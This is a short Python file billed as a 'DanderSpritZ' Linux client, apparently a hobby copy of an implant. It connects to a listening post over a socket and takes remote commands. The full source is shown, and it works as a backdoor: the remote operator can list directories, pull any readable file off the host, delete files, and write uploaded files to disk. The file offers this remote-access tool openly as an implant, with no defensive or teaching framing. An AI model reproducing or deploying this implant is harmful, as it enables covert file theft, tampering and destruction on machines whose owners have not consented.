## DanderSpritZ Client for Linux 01
## By ShowNadda

# Global Imports
import time
import sys
import os
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = '127.0.0.1'
port = 8090
s.connect ((host, port))
print("")
print("Successfully connected to DanderSpritZ Listening Post.")
print("")

# Main Command receive and execute loop

while 1:
    command = s.recv(1024)
    command = command.decode()
    print("Command received")
    print("")
    if command == "view_cfd":
        files = os.getcwd()
        files = str(files)
        s.send("".encode())
        s.send(files.encode())
        print("Command 'View current implant directory' has been successfully executed!")

    elif command == "custom_dir":
        user_input = s.recv(5000)
        user_input = user_input.decode()
        files = os.listdir(user_input)
        files = str(files)
        s.send(files.encode())
        print("Command 'Search for custom directory' has been successfully executed!")
        
    elif command == "file_download_remote":
        file_path= s.recv(5000)
        file_path= file_path.decode()
        file = open(file_path, "rb")
        data = file.read()
        s.send(data)
        print("")
        print("remote file download command has been executed.")
        print("")    

    elif command == "remove_file":
        dirandfile = s.recv(5000)
        dirandfile = dirandfile.decode()
        os.remove(dirandfile)
        print("")
        print("File deleted.")
        print("")

    elif command == "send_files":
        filename = s.recv(10000)  # Increase with a large file size. Both Client and LP need the same number.
        print(filename)
        new_file = open(filename,"wb")
        data = s.recv(10000)
        print(data)
        new_file.write(data)
        new_file.close()

    else:
        print("")
        print("Command not recognized.")